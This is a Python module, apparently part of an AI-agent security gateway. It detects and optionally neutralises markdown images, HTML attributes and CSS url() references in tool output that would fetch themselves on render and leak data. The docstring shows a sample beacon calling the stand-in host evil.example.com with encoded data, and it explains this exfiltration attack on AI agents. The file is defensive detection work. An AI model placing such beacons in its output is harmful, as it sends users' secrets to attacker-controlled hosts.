"""
Exfiltration beacons: the reference in tool output that fetches itself.

The attack needs no instruction and no cooperation from the model. A tool
result carries

    ![](https://evil.example.com/p.gif?d=c2VjcmV0)

and the moment a client renders that text -- a chat panel, an editor preview,
a web dashboard -- the renderer fetches the URL and the query string arrives at
somebody else's access log. Nothing asked the agent to send anything, so
``injection.exfiltration`` does not fire: that rule looks for a *request* to
send data, and here there is none. The renderer is the courier.

What probing established, and what it ruled out
-----------------------------------------------
The payload is the problem. A beacon carrying a recognisable token is caught
already, by the secret rules -- ``global.aws_access_key`` fires on
``?s=AKIA...`` and that is luck, not design. A beacon carrying a base64 blob,
or a summary of the repository, matches nothing at all. So the payload cannot
be the signal, and three ways of making it one were tried and dropped:

* **A length threshold** on the query string. Dropped. Removing
  ``injection.hidden_text`` taught this exact lesson: *their threshold was the
  bypass*. A beacon under the limit is a beacon.
* **Enumerating parameter names** (``d``, ``s``, ``data``, ``log``). Dropped.
  The attacker picks the name, so the space is infinite -- this is the same
  shape as trying to enumerate the spellings of a package install, which is
  the thing the dependency rules stopped doing.
* **Neutralising by default.** Dropped *as a default* rather than as an idea.
  Turning ``![alt](url)`` into ``[alt](url)`` removes the auto-fetch and
  destroys nothing, but it edits text a human is going to read, and the rule
  this project settled on is that glyphless characters may be stripped and
  meaning-bearing content may not. So it is offered, and switched on by the
  operator.

What is left is the only form with nothing to bypass: **an allowlist of hosts
whose untrusted content may fetch itself.** That is the Content Security Policy
model, and the reason it holds is that it does not reason about the payload at
all. A host is on the list or it is not.

Enumerating the *forms* is not the same mistake as enumerating parameter names,
and the difference is worth stating because it looks identical. A parameter
name is chosen by the attacker. The set of constructs a renderer fetches
without being asked is chosen by HTML and by the renderer -- it is finite,
published, and the same for everyone. Enumerating it is the move that works,
the way enumerating shell metacharacters works.

Two tiers, which is the shape the rug pull already uses
-------------------------------------------------------
**Note**, by default: the hosts are named, in the agent's note and in the
decision record, and not one byte of the output is touched. **Neutralise**, on
``render.neutralise: true``, for an operator who knows their clients render
untrusted markdown and would rather the fetch not happen. The edit is the
smallest one that stops the fetch and keeps the information: an image becomes a
link, an auto-fetching attribute keeps its URL under a name no renderer
fetches. A human can still read every URL and undo every edit.

WARNING, like every ``injection.*`` rule. A false positive here is a README
badge, and the cost of being told about a badge is one line.

Author
------
Warith Harchaoui
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import TYPE_CHECKING
from urllib.parse import urlsplit

from .i18n import DEFAULT_LOCALE, translator

if TYPE_CHECKING:  # pragma: no cover - import cycle avoided at runtime
    from .rules import Rule

#: Attributes a renderer fetches without being asked, and the elements that
#: carry them. Enumerated because the set is HTML's, not the attacker's -- see
#: the module docstring on why this is unlike enumerating parameter names.
#:
#: ``href`` is here only for ``link``, which is how a stylesheet or a preload
#: fetches itself. An ``href`` on an anchor is a link a person clicks, and
#: flagging those would flag every URL in every document.
AUTO_FETCHING_TAG = re.compile(
    r"<\s*(?:img|image|iframe|embed|script|audio|video|source|track|input|link|object)"
    r"\b[^>]{0,2000}>?",
    re.IGNORECASE,
)

#: The attributes, matched *inside* a tag the pattern above found.
#:
#: Two levels rather than one pattern, and that is a bug fix rather than taste.
#: A single pattern consumes the tag up to its first auto-fetching attribute,
#: so `<video poster="..." src="...">` was reported and neutralised once while
#: the second URL stayed live -- a control that looks like it worked and left
#: the fetch in place, which is worse than one that plainly does not run.
#: ``(?<![-\w])`` rather than ``\b``, and that is a bug fix found by screening
#: this module's own output: ``\b`` matches between the hyphen and the ``s`` of
#: ``data-ai-bunker-blocked-src``, so a neutralised tag was detected again as a
#: live beacon. Neutralising has to be idempotent or the note it produces is
#: about the fix rather than the attack.
FETCHING_ATTR = re.compile(
    r"""(?<![-\w])(?P<attr>src|srcset|poster|data|href)\s*=\s*
        (?:"(?P<dq>[^"]{0,800})"|'(?P<sq>[^']{0,800})'|(?P<bare>[^\s>]{1,400}))""",
    re.VERBOSE | re.IGNORECASE,
)

#: A markdown image. The ``!`` is the whole difference between a link a person
#: chooses to follow and a fetch that happens on render.
MARKDOWN_IMAGE = re.compile(r"!\[[^\]\n]{0,200}\]\(\s*<?(?P<url>[^)>\s]{1,400})")

#: A reference-style image, and the definition it points at. Both halves are
#: needed: `![x][1]` carries no URL and `[1]: https://...` is not a fetch on
#: its own. Without this pair the rule above is bypassed by moving the URL one
#: line down, which is a two-line rewrite and therefore not a control.
MARKDOWN_IMAGE_REF = re.compile(r"!\[[^\]\n]{0,200}\]\[(?P<label>[^\]\n]{1,100})\]")
MARKDOWN_DEFINITION = re.compile(
    r"^[ \t]{0,3}\[(?P<label>[^\]\n]{1,100})\]:[ \t]*<?(?P<url>\S{1,400}?)>?[ \t]*$",
    re.MULTILINE,
)

#: ``background: url(...)`` in a style attribute or a style block. Fetched on
#: render like an image, and it reaches the same access log. Same lookbehind as
#: above, and for the same reason: ``blocked-url(`` must not read as ``url(``.
CSS_URL = re.compile(r"(?<![-\w])url\(\s*['\"]?(?P<url>[^)'\"\s]{1,400})", re.IGNORECASE)

#: Fenced blocks and inline code spans. A renderer does not fetch from inside
#: one, so a README that *documents* `![](https://host/x.png)` is not a beacon
#: -- and the files an agent reads most are exactly the ones that show markup
#: as an example. Flagging those would train an operator to ignore this rule.
CODE = re.compile(r"```.*?```|~~~.*?~~~|`[^`\n]{1,400}`", re.DOTALL)

#: Schemes that reach a third party. ``data:`` and ``cid:`` carry their own
#: bytes and go nowhere, so they are not beacons.
REMOTE = re.compile(r"^(?:https?:)?//", re.IGNORECASE)


@dataclass(frozen=True)
class Reference:
    """One construct that fetches itself when the output is rendered."""

    url: str
    host: str
    #: ``markdown``, ``markdown-reference``, ``html`` or ``css``. Carried so a
    #: note can say what kind of thing it found and a test can prove each form
    #: is covered.
    form: str


@dataclass
class Finding:
    """Auto-fetching references to hosts the operator has not allowed."""

    references: list[Reference] = field(default_factory=list)
    #: Hosts that were allowed, kept so the note can stay quiet about them and
    #: a caller can still see the allowlist did something.
    allowed: list[str] = field(default_factory=list)

    @property
    def hosts(self) -> list[str]:
        """The offending hosts, deduplicated, in first-seen order."""
        out: list[str] = []
        for reference in self.references:
            if reference.host not in out:
                out.append(reference.host)
        return out

    def __bool__(self) -> bool:
        return bool(self.references)


def _host(url: str) -> str:
    """The host a URL fetches from, lowercased, or ``""`` if it is not remote.

    A protocol-relative ``//evil.example/x.png`` fetches over whatever scheme
    the page used, so it is remote and `urlsplit` needs the scheme put back
    before it will say so.
    """
    if not REMOTE.match(url):
        return ""
    candidate = url if "//" not in url[:2] else f"https:{url}"
    try:
        return (urlsplit(candidate).hostname or "").lower()
    except ValueError:
        # A URL malformed enough to fail parsing is not one a renderer will
        # fetch either, but it must not take the gateway down on the way past.
        return ""


def _attribute_urls(match: re.Match[str]) -> list[str]:
    """The URLs one auto-fetching attribute asks for.

    Usually one. ``srcset`` is the exception -- it carries a comma-separated
    list with a density descriptor after each URL, so
    ``srcset="https://ok/a.png 1x, https://evil/b.png 2x"`` holds two, and
    reading only the first would leave the second fetching.
    """
    value = match.group("dq") or match.group("sq") or match.group("bare") or ""
    if match.group("attr").lower() != "srcset":
        return [value.strip()] if value.strip() else []
    return [part.split()[0] for part in value.split(",") if part.split()]


def _blank_code(text: str) -> str:
    """Replace code with blanks of the same shape.

    Newlines are kept so a reference definition on the next line still starts
    at a line boundary -- the definition pattern is anchored per line, and
    collapsing a fence into spaces would glue two lines together and lose it.
    """
    return CODE.sub(lambda m: "".join("\n" if c == "\n" else " " for c in m.group(0)), text)


def find(text: str) -> list[Reference]:
    """Every construct in ``text`` that a renderer would fetch by itself."""
    if not isinstance(text, str) or not text:
        return []

    text = _blank_code(text)
    found: list[Reference] = []

    def add(url: str, form: str) -> None:
        host = _host(url)
        if host:
            found.append(Reference(url=url, host=host, form=form))

    for match in MARKDOWN_IMAGE.finditer(text):
        add(match.group("url"), "markdown")

    # Only definitions an image actually points at. A reference definition used
    # by an ordinary link is a link, and labels are case-insensitive in every
    # markdown implementation worth worrying about.
    labels = {m.group("label").strip().lower() for m in MARKDOWN_IMAGE_REF.finditer(text)}
    if labels:
        for match in MARKDOWN_DEFINITION.finditer(text):
            if match.group("label").strip().lower() in labels:
                add(match.group("url"), "markdown-reference")

    for tag in AUTO_FETCHING_TAG.finditer(text):
        for attribute in FETCHING_ATTR.finditer(tag.group(0)):
            for url in _attribute_urls(attribute):
                add(url, "html")

    for match in CSS_URL.finditer(text):
        add(match.group("url"), "css")

    return found


def assess(text: str, allow_hosts: tuple[str, ...] | list[str] = ()) -> Finding:
    """What fetches itself, minus the hosts the operator has allowed.

    Parameters
    ----------
    text : str
        Tool output, before it reaches the model.
    allow_hosts : tuple of str
        Hosts whose untrusted content may fetch itself. Matched on the host
        and on its subdomains, because an allowlist naming ``example.com``
        that then flagged ``cdn.example.com`` would be read as broken and
        replaced by something broader.

    Returns
    -------
    Finding
        Empty when nothing fetches itself, or when every host is allowed.
    """
    allowed_set = {h.strip().lower().lstrip(".") for h in allow_hosts if h and h.strip()}

    offending: list[Reference] = []
    allowed: list[str] = []
    for reference in find(text):
        if any(
            reference.host == name or reference.host.endswith(f".{name}") for name in allowed_set
        ):
            if reference.host not in allowed:
                allowed.append(reference.host)
            continue
        offending.append(reference)

    return Finding(references=offending, allowed=allowed)


def note(finding: Finding, locale: str = DEFAULT_LOCALE) -> str:
    """What the agent is told: the hosts, never the payload.

    The URLs are summarised by host rather than quoted in full. A beacon's
    query string *is* the stolen data, and repeating it into the context window
    would hand the model the exfiltrated bytes a second time while explaining
    that they were being stolen.
    """
    _ = translator(locale)
    return _.ngettext(
        "render.beacon",
        len(finding.hosts),
        hosts=", ".join(finding.hosts),
        count_refs=len(finding.references),
    )


def as_rule(finding: Finding, locale: str = DEFAULT_LOCALE) -> Rule:
    """Express the finding as a Rule, so nothing downstream needs a second path.

    `Rule` is imported in the function rather than at module level, the way
    `payments.as_rule` does it: the annotation is a string under
    ``from __future__ import annotations``, and a module-level import in this
    direction would be the first half of a cycle.
    """
    from .rules import Rule

    return Rule(
        id="render.beacon",
        severity="WARNING",
        scope="output",
        description=note(finding, locale),
        pattern=re.compile(r"(?!)"),  # never matches: decided in code
        redact=False,
        replacement="",
        source="beacon.py",
    )


def neutralise(text: str, allow_hosts: tuple[str, ...] | list[str] = ()) -> str:
    """Stop the fetches without destroying what they said.

    Off unless the operator asks for it, because this edits text a person will
    read. Every edit is the smallest one that works and none of them lose a
    URL:

    * ``![alt](url)`` becomes ``[alt](url)`` -- an image becomes a link, which
      is the same information and no longer fetches on render. A
      reference-style ``![alt][1]`` is demoted the same way, since the fetch
      is in the ``!`` and not in the definition line.
    * An auto-fetching attribute is renamed ``data-ai-bunker-blocked-src``.
      No renderer fetches it; the URL is still there, visible and auditable.
    * ``url(...)`` becomes ``blocked-url(...)``, an unknown function, which a
      stylesheet ignores.

    Hosts on the allowlist are left exactly as they arrived, so a deployment
    that neutralises does not also break its own badges.
    """
    if not isinstance(text, str) or not text:
        return text

    allowed_set = {h.strip().lower().lstrip(".") for h in allow_hosts if h and h.strip()}

    def offending(url: str) -> bool:
        host = _host(url)
        if not host:
            return False
        return not any(host == name or host.endswith(f".{name}") for name in allowed_set)

    def demote_image(match: re.Match[str]) -> str:
        """Drop the leading ``!``; everything else is kept byte for byte."""
        return match.group(0)[1:] if offending(match.group("url")) else match.group(0)

    def demote_attribute(match: re.Match[str]) -> str:
        """Rename one auto-fetching attribute, keeping its value untouched.

        Any URL in the attribute being worth stopping is enough to rename it:
        a `srcset` listing an allowed host and an unknown one still fetches
        from the unknown one, so leaving the attribute live because part of it
        was fine would leave the beacon working.
        """
        urls = _attribute_urls(match)
        if not any(offending(url) for url in urls):
            return match.group(0)
        whole = match.group(0)
        start, end = match.start("attr") - match.start(), match.end("attr") - match.start()
        return f"{whole[:start]}data-ai-bunker-blocked-{whole[start:end]}{whole[end:]}"

    def demote_tag(match: re.Match[str]) -> str:
        """Every auto-fetching attribute in the tag, not just the first."""
        return FETCHING_ATTR.sub(demote_attribute, match.group(0))

    def demote_css(match: re.Match[str]) -> str:
        return f"blocked-{match.group(0)}" if offending(match.group("url")) else match.group(0)

    # The reference-style images whose definitions point at a host worth
    # stopping, resolved before any rewriting so the labels still match.
    definitions = {
        m.group("label").strip().lower(): m.group("url")
        for m in MARKDOWN_DEFINITION.finditer(_blank_code(text))
    }

    def demote_image_reference(match: re.Match[str]) -> str:
        url = definitions.get(match.group("label").strip().lower(), "")
        return match.group(0)[1:] if url and offending(url) else match.group(0)

    def rewrite(chunk: str) -> str:
        out = MARKDOWN_IMAGE.sub(demote_image, chunk)
        out = MARKDOWN_IMAGE_REF.sub(demote_image_reference, out)
        out = AUTO_FETCHING_TAG.sub(demote_tag, out)
        return CSS_URL.sub(demote_css, out)

    # Code is copied through untouched rather than masked, because this
    # function returns text a person reads: rewriting the example inside a
    # README's code fence would edit documentation to stop a fetch that was
    # never going to happen. Walking the segments keeps every offset honest,
    # which a mask-then-substitute pass would not.
    pieces: list[str] = []
    last = 0
    for span in CODE.finditer(text):
        pieces.append(rewrite(text[last : span.start()]))
        pieces.append(span.group(0))
        last = span.end()
    pieces.append(rewrite(text[last:]))
    return "".join(pieces)
